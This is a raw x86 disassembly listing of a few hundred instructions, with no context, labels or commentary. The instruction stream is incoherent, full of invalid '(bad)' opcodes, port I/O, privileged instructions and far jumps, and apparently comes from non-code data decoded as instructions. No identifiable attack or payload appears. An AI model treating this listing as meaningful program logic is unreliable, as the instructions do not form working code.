  40fbb0:	imul   ecx,DWORD PTR [ecx-0x1281229d],0xa744f089
  40fbba:	popf   
  40fbbb:	call   FWORD PTR [edi]
  40fbbd:	call   0xb26261a9
  40fbc2:	jp     0x40fc22
  40fbc4:	inc    edi
  40fbc5:	adc    dl,al
  40fbc7:	or     DWORD PTR [esi+0x52],0x78bdb0d7
  40fbce:	pop    es
  40fbcf:	xchg   edi,eax
  40fbd0:	(bad)  
  40fbd1:	jmp    0x397183cd
  40fbd6:	sbb    ebx,DWORD PTR [ebp-0x43ddaf1c]
  40fbdc:	sbb    dh,BYTE PTR [ebx+eax*8-0x4cf8c23]
  40fbe3:	cmp    eax,0x3199fea0
  40fbe8:	and    al,dl
  40fbea:	pop    ebp
  40fbeb:	and    BYTE PTR [ebp+0x5328d2c3],bl
  40fbf1:	add    DWORD PTR [esi+0x9],esp
  40fbf4:	test   eax,0x2fe2dcfe
  40fbf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fbfa:	or     al,0x4e
  40fbfc:	cmp    BYTE PTR [esi],0x49
  40fbff:	or     al,0x95
  40fc01:	pop    esp
  40fc02:	sti    
  40fc03:	lods   al,BYTE PTR ds:[esi]
  40fc04:	mov    bh,0x11
  40fc06:	mov    DWORD PTR [ebx-0x4ac60bae],esi
  40fc0c:	jl     0x40fbfe
  40fc0e:	(bad)  
  40fc10:	sti    
  40fc11:	mov    edi,0x8dbc3d0a
  40fc16:	mov    BYTE PTR [edx+0x6e],bh
  40fc19:	popf   
  40fc1a:	add    edx,DWORD PTR [ecx-0x1eb004e3]
  40fc20:	ins    DWORD PTR es:[edi],dx
  40fc21:	inc    edi
  40fc22:	es inc esp
  40fc24:	scas   al,BYTE PTR es:[edi]
  40fc25:	repz fsubr DWORD PTR [esi+0x542be6d3]
  40fc2c:	mov    eax,0xce67e5d9
  40fc31:	lea    edx,[eax-0x631968d8]
  40fc37:	xchg   esp,eax
  40fc38:	ds jae 0x40fc29
  40fc3b:	mov    dh,0x30
  40fc3d:	mov    ch,0xc
  40fc3f:	popf   
  40fc40:	mov    ebp,0x31d59892
  40fc45:	int    0x61
  40fc47:	sbb    eax,0xd1f06761
  40fc4c:	jnp    0x40fc4e
  40fc4e:	mov    al,ds:0x16cbb918
  40fc53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc54:	xchg   esi,eax
  40fc55:	sbb    dh,BYTE PTR [edx+0x2f]
  40fc58:	sub    cl,ch
  40fc5a:	int3   
  40fc5b:	aam    0xcd
  40fc5d:	pop    ds
  40fc5e:	repnz lock mov edx,0x7a7dd656
  40fc65:	mov    BYTE PTR [edi-0x30caaa0f],ch
  40fc6b:	inc    ebx
  40fc6c:	(bad)  
  40fc6d:	pop    ds
  40fc6e:	xor    al,0x31
  40fc70:	rol    dh,0x57
  40fc73:	push   es
  40fc74:	and    eax,0x27d6f910
  40fc79:	mov    BYTE PTR [ebp+edi*4-0x4b88259],ch
  40fc80:	jne    0x40fc8c
  40fc82:	push   cs
  40fc83:	(bad)
  40fc86:	ret    
  40fc87:	xchg   bl,cl
  40fc89:	cmp    eax,0xc71e804f
  40fc8e:	imul   edi,DWORD PTR [eax-0x66],0x1e
  40fc92:	mov    al,0x2d
  40fc94:	outs   dx,DWORD PTR ds:[esi]
  40fc95:	int3   
  40fc96:	sbb    bl,BYTE PTR [edi+0x2e]
  40fc99:	or     al,0x8d
  40fc9b:	pop    es
  40fc9c:	push   esi
  40fc9d:	mov    ch,0x85
  40fc9f:	sbb    DWORD PTR [ecx],esi
  40fca1:	cmp    eax,eax
  40fca3:	push   0x86ff0bae
  40fca8:	dec    eax
  40fca9:	jns    0x40fcde
  40fcab:	and    bl,0xe7
  40fcae:	scas   eax,DWORD PTR es:[edi]
  40fcaf:	xor    al,0x5e
  40fcb1:	add    BYTE PTR [ecx+0x7842d83d],bl
  40fcb7:	xor    bh,ah
  40fcb9:	arpl   WORD PTR [edx+0x45],bx
  40fcbc:	mov    bh,0x55
  40fcbe:	sbb    esi,DWORD PTR [ebx]
  40fcc0:	pop    edi
  40fcc1:	mov    edx,0xea85c6ff
  40fcc6:	xchg   ecx,eax
  40fcc7:	pop    edi
  40fcc8:	xor    edx,DWORD PTR [ecx]
  40fcca:	not    DWORD PTR [edi-0x55]
  40fccd:	jg     0x40fd4a
  40fccf:	aaa    
  40fcd0:	mov    ebp,esi
  40fcd2:	xor    DWORD PTR [esi+0x76],ecx
  40fcd5:	cmp    DWORD PTR [ebx],esi
  40fcd7:	dec    esi
  40fcd8:	jmp    0x3256:0x975ebb82
  40fcdf:	(bad)  
  40fce0:	loopne 0x40fd58
  40fce2:	dec    edx
  40fce3:	xchg   esi,eax
  40fce4:	add    DWORD PTR [ecx+0x10],esi
  40fce7:	and    ah,al
  40fce9:	test   BYTE PTR [esi-0x23],dh
  40fcec:	outs   dx,BYTE PTR ds:[esi]
  40fced:	sbb    edx,ebp
  40fcef:	shl    ecx,0x83
  40fcf2:	or     ch,BYTE PTR [edi+eiz*2]
  40fcf5:	pop    ebx
  40fcf6:	leave  
  40fcf7:	mov    DWORD PTR [edi],eax
  40fcf9:	mov    edi,0x7030b95b
  40fcfe:	shl    BYTE PTR [eax+0x1e38c9af],0x6c
  40fd05:	sub    ah,ch
  40fd07:	test   BYTE PTR [edx+esi*4+0x69feafa3],0x76
  40fd0f:	repz xor DWORD PTR [edi-0x55],0xa
  40fd14:	cli    
  40fd15:	pop    ebx
  40fd16:	push   0x1a
  40fd18:	pop    ebx
  40fd19:	call   edx
  40fd1b:	push   ebp
  40fd1c:	in     al,dx
  40fd1d:	out    dx,eax
  40fd1e:	jno    0x40fd6a
  40fd20:	fstp   DWORD PTR [ecx-0x2623099a]
  40fd26:	sbb    bl,bh
  40fd28:	pushf  
  40fd29:	push   ebx
  40fd2a:	arpl   WORD PTR [eax+0x4e],ax
  40fd2d:	pop    ebp
  40fd2e:	push   eax
  40fd2f:	frstor [ecx-0x2f21d17d]
  40fd35:	ret    0x84c0
  40fd38:	loopne 0x40fccf
  40fd3a:	mov    ds,WORD PTR [esi-0x4f]
  40fd3d:	mov    ebp,0xc3766c81
  40fd42:	sub    al,0x5e
  40fd44:	inc    esp
  40fd45:	inc    ebx
  40fd46:	retf   
  40fd47:	mov    bl,0xcb
  40fd49:	jecxz  0x40fcce
  40fd4b:	lods   eax,DWORD PTR ds:[esi]
  40fd4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd4d:	xchg   edx,eax
  40fd4e:	sub    edx,DWORD PTR [edx-0x18]
  40fd51:	jae    0x40fce1
  40fd53:	jge    0x40fd3e
  40fd55:	mov    al,ds:0x6e405716
  40fd5a:	sbb    ecx,DWORD PTR [eax+0x2d]
  40fd5d:	out    dx,al
  40fd5e:	das    
  40fd5f:	mov    DWORD PTR [ebx-0x36b57828],ecx
  40fd65:	adc    al,0xa8
  40fd67:	jp     0x40fd4e
  40fd69:	sti    
  40fd6a:	mov    esi,0x838d84c6
  40fd6f:	dec    edx
  40fd70:	jmp    0x40fd04
  40fd72:	and    eax,0xd84dcbfc
  40fd77:	mov    al,ds:0xd1574fe8
  40fd7c:	and    ah,BYTE PTR [esp+esi*1+0x28e2f3b5]
  40fd83:	(bad)  
  40fd84:	cld    
  40fd85:	sbb    al,BYTE PTR [ebp+ecx*2+0x2d]
  40fd89:	jecxz  0x40fd2c
  40fd8b:	test   al,0xe0
  40fd8d:	clc    
  40fd8e:	pop    ecx
  40fd8f:	popa   
  40fd90:	in     eax,0xd3
  40fd92:	enter  0x4a73,0x49
  40fd96:	adc    eax,0xdffa644
  40fd9b:	mov    edi,DWORD PTR [eax+0x17]
  40fd9e:	or     eax,0xac2994de
  40fda3:	(bad)  
  40fda4:	int3   
  40fda5:	sub    ebx,DWORD PTR gs:[eax-0x4f151844]
  40fdac:	and    al,0xa8
  40fdae:	xchg   ebx,eax
  40fdaf:	sub    cl,BYTE PTR [edx+0x3672ae34]
  40fdb5:	retf   
  40fdb6:	mov    ebp,0xcc2cf928
  40fdbb:	mov    ds:0x1c6d7e1e,eax
  40fdc0:	adc    esi,DWORD PTR cs:[edx+0x6147abe7]
  40fdc7:	cwde   
  40fdc8:	xor    ecx,ebx
  40fdca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fdcb:	jmp    0x40fd96
  40fdcd:	mov    ss,WORD PTR [esi+0x49b7d367]
  40fdd3:	inc    ecx
  40fdd4:	push   ebx
  40fdd5:	(bad)  
  40fdd6:	idiv   BYTE PTR [ecx-0x20]
  40fdd9:	xor    al,0x6f
  40fddb:	(bad)  
  40fddc:	add    edx,edx
  40fdde:	out    dx,eax
  40fddf:	leave  
  40fde0:	out    0xd4,al
  40fde2:	repnz sbb dl,0x49
  40fde6:	jecxz  0x40fde5
  40fde8:	mov    al,ds:0x7fbce27e
  40fded:	sub    ah,0x81
  40fdf0:	std    
  40fdf1:	dec    ecx
  40fdf2:	dec    eax
  40fdf3:	or     BYTE PTR [ebp-0x51],dh
  40fdf6:	xor    dh,dh
  40fdf8:	ins    BYTE PTR es:[edi],dx
  40fdf9:	jo     0x40fe47
  40fdfb:	retf   0x100e
  40fdfe:	stos   BYTE PTR es:[edi],al
  40fdff:	mov    dh,0xe6
  40fe01:	daa    
  40fe02:	push   edi
  40fe03:	call   0x9407d8d8
  40fe08:	cmp    eax,0x660876aa
  40fe0d:	sar    BYTE PTR ds:0x95f4c0e5,cl
  40fe13:	shl    eax,0xee
  40fe16:	inc    ebx
  40fe17:	inc    ebx
  40fe18:	retf   
  40fe19:	pop    ds
  40fe1a:	cmp    dl,BYTE PTR [edx+0x53]
  40fe1d:	cwde   
  40fe1e:	mov    esi,0x11c80fc
  40fe23:	pop    ecx
  40fe24:	fcomp  QWORD PTR [ecx-0x741d254]
  40fe2a:	xlat   BYTE PTR ds:[ebx]
  40fe2b:	pop    es
  40fe2c:	(bad)  [ebp-0x23]
  40fe2f:	cmp    eax,ebx
  40fe31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe32:	jnp    0x40fe5c
  40fe34:	fmul   st(1),st
  40fe36:	ficomp WORD PTR [eax-0x32d46ef]
  40fe3c:	inc    ebp
  40fe3d:	arpl   WORD PTR [ebp+esi*2+0x17],si
  40fe41:	pop    ebx
  40fe42:	or     esp,ecx
  40fe44:	and    ch,BYTE PTR [esi]
  40fe46:	mov    al,0x85
  40fe48:	or     BYTE PTR [eax],dl
  40fe4a:	dec    edi
  40fe4b:	sbb    bh,BYTE PTR [edi]
  40fe4d:	jge    0x40fe03
  40fe4f:	ret    0xb9a0
  40fe52:	sub    eax,0xabaf1930
  40fe57:	stc    
  40fe58:	adc    dl,cl
  40fe5a:	push   eax
  40fe5b:	push   ss
  40fe5c:	dec    ebx
  40fe5d:	mov    ebp,0xc2add46d
  40fe62:	jnp    0x40fdfe
  40fe64:	dec    al
  40fe66:	add    al,0x20
  40fe68:	aad    0xd2
  40fe6a:	xchg   edx,eax
  40fe6b:	enter  0xb935,0x3c
  40fe6f:	(bad)  
  40fe70:	repnz enter 0x5422,0x1a
  40fe75:	push   ebp
  40fe76:	data16 or dh,dl
  40fe79:	rcr    bh,1
  40fe7b:	aas    
  40fe7c:	or     eax,0x64155563
  40fe81:	or     DWORD PTR [ecx-0x7a],0x25
  40fe85:	mov    ebp,0x42d69987
  40fe8a:	adc    ch,BYTE PTR [eax-0x115f61c]
  40fe90:	push   edx
  40fe91:	or     BYTE PTR [edi-0x7726d8b0],cl
  40fe97:	in     al,dx
  40fe98:	das    
  40fe99:	add    ah,BYTE PTR [edi-0x42]
  40fe9c:	dec    edx
  40fe9d:	push   0xc3884de7
  40fea2:	push   ds
  40fea3:	fbld   TBYTE PTR [eax+0x7a30eda9]
  40fea9:	addr16 pop ds
  40feab:	mov    ds:0x1434e2d,eax
  40feb0:	and    al,0xfd
  40feb2:	xor    BYTE PTR [ebx+0x4993befd],cl
  40feb8:	mov    edx,0xacba284
  40febd:	rol    DWORD PTR [edi],0xf5
  40fec0:	inc    esi
  40fec1:	ret    
  40fec2:	shl    DWORD PTR [esi+0x33ebd0ee],0xd1
  40fec9:	faddp  st(7),st
  40fecb:	inc    ecx
  40fecc:	test   eax,0x1a9bbaf0
  40fed1:	pop    eax
  40fed2:	pop    edi
  40fed3:	push   0x37
  40fed5:	ja     0x40ff24
  40fed7:	push   0x7ca44f5a
  40fedc:	mov    ds:0xbbde57c8,eax
  40fee1:	dec    ecx
  40fee2:	dec    ecx
  40fee3:	in     al,0x62
  40fee5:	rol    BYTE PTR [esi],1
  40fee7:	jge    0x40feaf
  40fee9:	adc    bl,dh
  40feeb:	jne    0x40ff2e
  40feed:	retf   0x4d69
  40fef0:	int3   
  40fef1:	jmp    0x40fefb
  40fef3:	mov    esp,0xa5eddff0
  40fef8:	pop    edi
  40fef9:	and    BYTE PTR [edi+0x28],dh
  40fefc:	repz cmp al,0x61
  40feff:	mov    esp,edx
  40ff01:	add    al,0xa6
  40ff03:	jns    0x40ff33
  40ff05:	js     0x40fedc
  40ff07:	mov    eax,0xb60c4252
  40ff0c:	cmp    BYTE PTR [ebp+0x4e],bl
  40ff0f:	push   es
  40ff10:	fidivr DWORD PTR [ebp-0x7b00441e]
  40ff16:	pop    es
  40ff17:	pop    edx
  40ff18:	ror    BYTE PTR [ebx+0x5c],0xe6
  40ff1c:	and    al,0x61
  40ff1e:	je     0x40ff25
  40ff20:	jge    0x40fea6
  40ff22:	lods   al,BYTE PTR ds:[esi]
  40ff23:	mov    esp,0x70922a34
  40ff28:	cvtps2pd xmm4,QWORD PTR [ebp+0x5a31e76e]
  40ff2f:	push   edx
  40ff30:	xor    eax,0xa81e65fa
  40ff35:	in     al,0xf5
  40ff37:	push   ecx
  40ff38:	test   al,0xac
  40ff3a:	add    esi,DWORD PTR [edx]
  40ff3c:	je     0x40fefc
  40ff3e:	jmp    0x40ffa0
  40ff40:	add    BYTE PTR [eax],dh
  40ff42:	out    dx,eax
  40ff43:	scas   al,BYTE PTR es:[edi]
  40ff44:	aad    0xc2
  40ff46:	fs shl dh,cl
  40ff49:	stc    
  40ff4a:	fnstsw WORD PTR [ebx+0x4f]
  40ff4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff4e:	(bad)
  40ff52:	cld    
  40ff53:	test   al,0xc
  40ff55:	mov    ds:0xe809f64e,al
  40ff5a:	sub    dl,dh
  40ff5c:	sbb    cl,bh
  40ff5e:	sti    
  40ff5f:	dec    esi
  40ff60:	cmp    bl,BYTE PTR [edx]
  40ff62:	pop    ebp
  40ff63:	fwait
  40ff64:	mov    ebx,0xcf2c81a8
  40ff69:	hlt    
  40ff6a:	push   ebp
  40ff6b:	and    ebx,DWORD PTR [esi+0x76]
  40ff6e:	cdq    
  40ff6f:	mov    ah,0x17
  40ff71:	(bad)  
  40ff72:	xor    DWORD PTR [ecx+0x9],esi
  40ff75:	(bad)  
  40ff76:	or     eax,0x36542db
  40ff7b:	add    DWORD PTR [ebx],esi
  40ff7d:	jmp    0xeb707bcd
  40ff82:	mov    ch,0xb7
  40ff84:	ins    BYTE PTR es:[edi],dx
  40ff85:	cmp    DWORD PTR [edx-0x3e],ebp
  40ff88:	imul   edx,DWORD PTR [ebp+0x2e692c93],0x52c84077
  40ff92:	dec    eax
  40ff93:	ja     0x40ff5e
  40ff95:	mov    ch,0x98
  40ff97:	add    al,0x3a
  40ff99:	cmp    al,0x85
  40ff9b:	popa   
  40ff9c:	repz xor al,0x7f
  40ff9f:	test   DWORD PTR [edx],ebp
  40ffa1:	jnp    0x40ffc1
  40ffa3:	jo     0x40ffae
  40ffa5:	add    dl,BYTE PTR [eax+0x2e7961d8]
  40ffab:	cmpxchg BYTE PTR [esi-0x2e],al
  40ffaf:	dec    esi
  40ffb0:	repnz outs dx,BYTE PTR ds:[esi]
  40ffb2:	test   eax,0x916fb12c
  40ffb7:	pop    edi
  40ffb8:	sbb    DWORD PTR ds:0xfb2d536c,esi
  40ffbe:	mov    edi,DWORD PTR [esi+0x74d436c7]
  40ffc4:	push   ds
  40ffc5:	add    eax,0x9da1b77
  40ffca:	daa    
  40ffcb:	mov    ah,BYTE PTR [edx-0x50ed5ca4]
  40ffd1:	sub    ebx,esp
  40ffd3:	dec    edi
  40ffd5:	cmp    DWORD PTR [ebp+0x5bd0d668],0xd5306ee2
  40ffdf:	jge    0x40ffb9
  40ffe1:	jg     0x410001
  40ffe3:	xor    cl,dl
  40ffe5:	cmp    dl,0x7f
  40ffe8:	sub    BYTE PTR [ebp-0x5c],dl
  40ffeb:	xor    ebp,edi
  40ffed:	fs inc edi
  40ffef:	aam    0x83
  40fff1:	xchg   esp,eax
  40fff2:	int3   
  40fff3:	vcmpsd xmm3,xmm0,QWORD PTR ds:0x58120514,0xd5
  40fffc:	(bad)  
  40fffd:	std    
  40fffe:	jbe    0x40ffc5
  410000:	or     BYTE PTR [eax-0x39],bh
  410003:	repnz dec edi
  410005:	inc    edx
  410006:	add    DWORD PTR ds:0x8c71bd6e,esp
  41000c:	div    BYTE PTR [edx]
  41000e:	das    
  41000f:	fsincos 
  410011:	frstor [eax+0x2e63114a]
  410017:	pop    ds
  410018:	sbb    edx,edi
  41001a:	sub    eax,0x26896990
  41001f:	outs   dx,DWORD PTR ds:[esi]
  410020:	ds xchg edx,eax
  410022:	jp     0x410049
  410024:	mov    dl,0xf0
  410026:	ror    BYTE PTR [edi-0x642c3aab],cl
  41002c:	mov    bh,0x41
  41002e:	mov    al,0xf3
  410030:	jo     0x41002d
  410032:	xchg   ebp,eax
  410033:	nop
  410034:	inc    ebp
  410035:	adc    eax,DWORD PTR [ebx]
  410037:	stc    
  410038:	in     eax,dx
  410039:	cwde   
  41003a:	lea    edi,[ecx+0x73839beb]
  410040:	stc    
  410041:	stc    
  410042:	mov    ?,WORD PTR [edi+0x233189]
  410048:	and    eax,0xd36fa393
  41004d:	mov    DWORD PTR [edi+0x7291c4cb],esp
  410053:	push   ecx
  410054:	ja     0x410097
  410056:	call   0x2161:0xa010d2b7
  41005d:	add    al,0xac
  41005f:	fdivr  st(2),st
  410061:	in     al,dx
  410062:	xchg   ebp,eax
  410063:	pop    ds
  410064:	and    dh,dh
  410066:	inc    eax
  410067:	dec    eax
  410068:	xor    eax,0xfacc021f
  41006d:	test   al,0xd2
  41006f:	push   0x6267c391
  410074:	xor    ah,BYTE PTR [ebp+0x56e17c25]
  41007a:	pop    ebp
  41007b:	mov    ecx,0x28f880a5
  410080:	mov    ah,0x98
  410082:	sbb    esp,edi
  410084:	inc    ebp
  410085:	jl     0x410069
  410087:	inc    edi
  410088:	inc    ebp
  410089:	mov    DWORD PTR [ecx+0x391db7e3],edi
  41008f:	cli    
  410090:	sar    DWORD PTR cs:[edx-0x679ee612],1
  410097:	and    al,0x27
  410099:	cdq    
  41009a:	repnz mov ebp,0x781a108d
  4100a0:	fbstp  TBYTE PTR [edx]
  4100a2:	sub    DWORD PTR [eax],edi
  4100a4:	aad    0xe
  4100a6:	mov    ch,0x3f
  4100a8:	cdq    
  4100a9:	push   0x3d3b40b2
  4100ae:	adc    ecx,edi
  4100b0:	push   eax
  4100b1:	cmp    al,BYTE PTR [ecx+0x26c7c7be]
  4100b7:	cmp    BYTE PTR [ebx-0x6e],bl
  4100ba:	pop    esp
  4100bb:	loopne 0x41013b
  4100bd:	shl    DWORD PTR [ebx-0x2d07d525],cl
  4100c3:	iret   
  4100c4:	xlat   BYTE PTR ds:[ebx]
  4100c5:	and    al,0x8d
  4100c7:	xchg   BYTE PTR [eax-0x78],ch
  4100ca:	lds    esp,FWORD PTR [ebx-0x49a9bc3e]
  4100d0:	neg    DWORD PTR [edi-0x164eb4d1]
  4100d6:	mov    bh,0x41
  4100d8:	adc    dh,BYTE PTR [ecx+0x1e0cef81]
  4100de:	mov    dl,0x63
  4100e0:	jne    0x410121
  4100e2:	inc    ebx
  4100e3:	mov    cl,0x6f
  4100e5:	lods   al,BYTE PTR ds:[esi]
  4100e6:	(bad)  
  4100e7:	add    cl,bl
  4100e9:	outs   dx,BYTE PTR ds:[esi]
  4100ea:	jmp    0x41013b
  4100ec:	lds    ebp,FWORD PTR [ebx]
  4100ee:	imul   eax,DWORD PTR [eax-0x26],0x47985a52
  4100f5:	test   ah,0x96
  4100f8:	js     0x41016c
  4100fa:	arpl   WORD PTR [edx-0x556e6a30],bp
  410100:	test   BYTE PTR [esi-0x76],dh
  410103:	mov    ?,WORD PTR [edx+edi*8+0x72614926]
  41010a:	xlat   BYTE PTR ds:[ebx]
  41010b:	sub    edi,esi
  41010d:	mov    ah,0x58
  41010f:	scas   al,BYTE PTR es:[edi]
  410110:	retf   0x3532
  410113:	out    dx,eax
  410114:	add    eax,0xa87ce8
  410119:	cmp    al,0xa7
  41011b:	jmp    0x41010f
  41011d:	jecxz  0x41017d
  41011f:	mov    al,0x91
  410121:	jo     0x410134
  410123:	mov    al,0x56
  410125:	mov    dl,0xb4
  410127:	push   edi
  410128:	(bad)
  41012c:	ret    
  41012d:	je     0x410146
  41012f:	fucompp 
  410131:	mov    ds,WORD PTR [ecx+0x15cc1c6e]
  410137:	(bad)  
  410138:	mov    dh,0xb8
  41013a:	inc    edx
  41013b:	(bad)  
  41013c:	jnp    0x410193
  41013e:	xor    BYTE PTR [eax],ch
  410140:	mov    dl,0x59
  410142:	add    al,0x5e
  410144:	test   al,0x32
  410146:	and    eax,DWORD PTR [esp+esi*8+0x4ae9319b]
  41014d:	inc    ecx
  41014e:	mov    BYTE PTR [edx-0x4d2c06d],dl
  410154:	mov    ds:0x6c443f05,al
  410159:	xchg   BYTE PTR [esi-0x61f4c075],dl
  41015f:	sti    
  410160:	pop    ebp
  410161:	sub    edx,0xffffff86
  410164:	cmp    bl,cl
  410166:	inc    esp
  410167:	nop
  410168:	clc    
  410169:	jge    0x410173
  41016b:	inc    esp
  41016c:	pushf  
  41016d:	or     DWORD PTR [eax+eax*1-0x48],ebp
  410171:	xchg   edi,eax
  410172:	out    0xc0,eax
  410174:	sbb    edi,DWORD PTR [edx]
  410176:	sahf   
  410177:	das    
  410178:	(bad)  
  410179:	(bad)  
  41017a:	sahf   
  41017b:	cmp    eax,0xffc500f0
  410180:	mov    al,0x20
  410182:	adc    BYTE PTR [eax+0x67],0x9b
  410186:	sbb    eax,0xe30aa3bc
  41018b:	and    BYTE PTR [eax+0x6b],dh
  41018e:	(bad)  
  41018f:	test   al,0x8b
  410191:	add    edx,esp
  410193:	sbb    dh,bh
  410195:	or     al,0x8a
  410197:	push   esp
  410198:	xor    ebx,DWORD PTR ds:[eax+0x5f]
  41019c:	imul   ebp,DWORD PTR [edi+0x23],0xb6143946
  4101a3:	inc    dx
  4101a5:	add    DWORD PTR [eax+0x7a1ec6e1],ebx
  4101ab:	mov    BYTE PTR [edx+edi*4-0x7b],ah
  4101af:	in     eax,0xa9
  4101b1:	mov    ebx,0x1740c7d5
  4101b6:	rol    edi,1
  4101b8:	ret    0x35e7
  4101bb:	add    eax,0xb0057e3
  4101c0:	mov    dh,0x78
  4101c2:	sub    BYTE PTR [eax-0x29768620],dl
  4101c8:	and    bl,ch
  4101ca:	cmp    DWORD PTR [si-0xb],ebp
  4101ce:	fs cld 
  4101d0:	(bad)  
  4101d1:	or     eax,0xe81d52c6
  4101d6:	rcr    DWORD PTR [esp+eiz*8],0xca
  4101da:	add    al,0x65
  4101dc:	jb     0x4101a2
  4101de:	les    ebx,FWORD PTR [edi]
  4101e0:	jge    0x4101f5
  4101e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101e3:	dec    ebx
  4101e4:	call   0x32b7ecc3
  4101e9:	lock test edx,ebp
  4101ec:	xchg   edi,eax
  4101ed:	sti    
  4101ee:	push   edi
  4101ef:	sbb    BYTE PTR [esp+ecx*8],bh
  4101f2:	mov    dh,0xf2
  4101f4:	mov    bl,0xd0
  4101f6:	out    0xd7,eax
  4101f8:	jmp    0x36f2:0x8b6e3e78
  4101ff:	mov    BYTE PTR [ecx],ch
  410201:	jmp    0x7cca:0x2f59a86
  410208:	lods   al,BYTE PTR ds:[esi]
  410209:	inc    esp
  41020a:	xor    DWORD PTR [ebp+ebx*8-0x42],ecx
  41020e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41020f:	ds pop es
  410211:	cli    
  410212:	mov    WORD PTR [ebx-0x80],ds
  410215:	imul   BYTE PTR [ebp+0x9]
  410218:	ror    DWORD PTR [ecx-0x4d],0x37
  41021c:	dec    edi
  41021d:	push   ds
  41021e:	mov    ebx,0x240c4b94
  410223:	in     eax,0x61
  410225:	dec    esi
  410226:	mov    ebp,0x39dc110d
  41022b:	add    DWORD PTR [ebp-0x472a00c3],ebx
  410231:	hlt    
  410232:	sub    ch,BYTE PTR [esp+esi*4+0x4a]
  410236:	sahf   
  410237:	cmc    
  410238:	xchg   DWORD PTR [ecx+0x1],ecx
  41023b:	lods   eax,DWORD PTR ds:[esi]
  41023c:	add    edx,ebp
  41023e:	(bad)  [ecx]
  410240:	pop    edi
  410241:	loope  0x410248
  410243:	sahf   
  410244:	xor    dl,dl
  410246:	cmp    DWORD PTR [edi+0x16],ecx
  410249:	call   0x86aeaa8b
  41024e:	call   0xdda6d3fd
  410253:	(bad)  
  410254:	push   ecx
  410255:	pop    edi
  410256:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410257:	ins    DWORD PTR es:[edi],dx
  410258:	test   DWORD PTR [esi],0xc2d9d757
  41025e:	(bad)  
  41025f:	pop    ebx
  410260:	cs jo  0x410211
  410263:	mov    ds:0x3d120f57,al
  410268:	loope  0x410220
  41026a:	js     0x4102c0
  41026c:	add    DWORD PTR [ecx],0x81f7a86d
  410272:	xchg   DWORD PTR [edx],ebp
  410274:	or     ch,BYTE PTR gs:[edx-0x35]
  410278:	imul   eax,DWORD PTR [eax-0x69],0xffffffc9
  41027c:	adc    eax,0xdaf5237
  410281:	std    
  410282:	mul    BYTE PTR [eax]
  410284:	push   cs
  410285:	stc    
  410286:	and    al,0x7b
  410288:	push   es
  410289:	fneni(8087 only) 
  41028b:	pop    edx
  41028c:	and    DWORD PTR [esi],edx
  41028e:	es inc esi
  410290:	mov    bh,0xaa
  410292:	xchg   esp,eax
  410293:	aas    
  410294:	jns    0x4102b9
  410296:	loop   0x410261
  410298:	daa    
  410299:	and    esi,DWORD PTR [ecx-0x11]
  41029c:	push   ebp
  41029d:	add    al,0x40
  41029f:	sbb    BYTE PTR [ebp-0x60],ah
  4102a2:	sbb    edi,edx
  4102a4:	mov    ch,0x3c
  4102a6:	adc    esp,DWORD PTR [edx]
  4102a8:	nop
  4102a9:	mov    bh,0x27
  4102ab:	dec    edx
  4102ac:	pop    ecx
  4102ad:	js     0x41023c
  4102af:	cmc    
  4102b0:	cmp    BYTE PTR [esi-0x3e],ch
  4102b3:	mov    ds:0x9311b96b,al
  4102b8:	ss add ebx,0x49243e26
  4102bf:	es pop es
  4102c1:	xchg   esp,eax
  4102c2:	stos   DWORD PTR es:[edi],eax
  4102c3:	mov    bh,0x34
  4102c5:	push   eax
  4102c6:	jp     0x41027a
  4102c8:	adc    esp,DWORD PTR [ebp-0x59]
  4102cb:	fcomp  QWORD PTR [ecx+esi*8]
  4102ce:	or     esp,esp
  4102d0:	xchg   esp,eax
  4102d1:	xchg   ch,dl
  4102d3:	jae    0x4102d8
  4102d5:	in     al,0x54
  4102d7:	cmp    al,0xf0
  4102d9:	sahf   
  4102da:	sub    eax,0x3e93317d
  4102df:	imul   ebp,DWORD PTR [edx-0x2],0xfbdff52a
  4102e6:	leave  
  4102e7:	cmp    eax,0x55367cfc
  4102ec:	push   ebx
  4102ed:	cmp    al,al
  4102ef:	dec    esi
  4102f0:	adc    ah,ah
  4102f2:	inc    ecx
  4102f3:	and    al,0xde
  4102f5:	xor    al,0x94
  4102f7:	retf   0x8c64
  4102fa:	retf   0x7b31
  4102fd:	pop    esi
  4102fe:	sbb    bh,BYTE PTR [eax+0x62e6a69e]
  410304:	lea    ecx,[ebx-0x6a51a434]
  41030a:	mov    ds:0xbb2d48dd,eax
  41030f:	aam    0x42
  410311:	xchg   ch,dh
  410313:	pop    es
  410314:	push   edi
  410315:	outs   dx,BYTE PTR ds:[esi]
  410316:	fxtract 
  410318:	pop    edx
  410319:	outs   dx,DWORD PTR ds:[esi]
  41031a:	test   eax,0x19f8ee39
  41031f:	or     BYTE PTR [edi],ah
  410321:	ja     0x41035e
  410323:	mov    esi,0xa00d7176
  410328:	ret    
  410329:	loop   0x410364
  41032b:	out    0x85,al
  41032d:	jbe    0x410319
  41032f:	cs push ebx
  410331:	jl     0x4103ab
  410333:	cmp    dl,BYTE PTR [edx+0x3f]
  410336:	(bad)  
  410339:	mov    esi,0xdf6c5907
  41033e:	out    dx,eax
  41033f:	push   esi
  410340:	dec    ebp
  410341:	retf   0xa61b
  410344:	shr    DWORD PTR [edx+0x0],cl
  410347:	call   0x50f8e81c
  41034c:	or     BYTE PTR [ecx+0x5b],cl
  41034f:	popf   
  410350:	rol    eax,1
  410352:	adc    BYTE PTR [esi+ebx*1],dh
  410355:	pop    ebx
  410356:	pop    ecx
  410357:	xchg   ebp,eax
  410358:	int    0xc9
  41035a:	push   esp
  41035b:	inc    ebp
  41035c:	fcomp  DWORD PTR [eax+esi*2-0x54]
  410360:	and    cl,BYTE PTR [ebp+0x7d]
  410363:	cmc    
  410364:	dec    ebp
  410365:	cmp    al,0x7c
  410367:	jne    0x4103d2
  410369:	mov    dl,0x32
  41036b:	pop    ss
  41036c:	mov    ch,0xdb
  41036e:	adc    BYTE PTR [edx-0x66],al
  410371:	jo     0x4103af
  410373:	sar    BYTE PTR [edx+0x647ef15e],0xd5
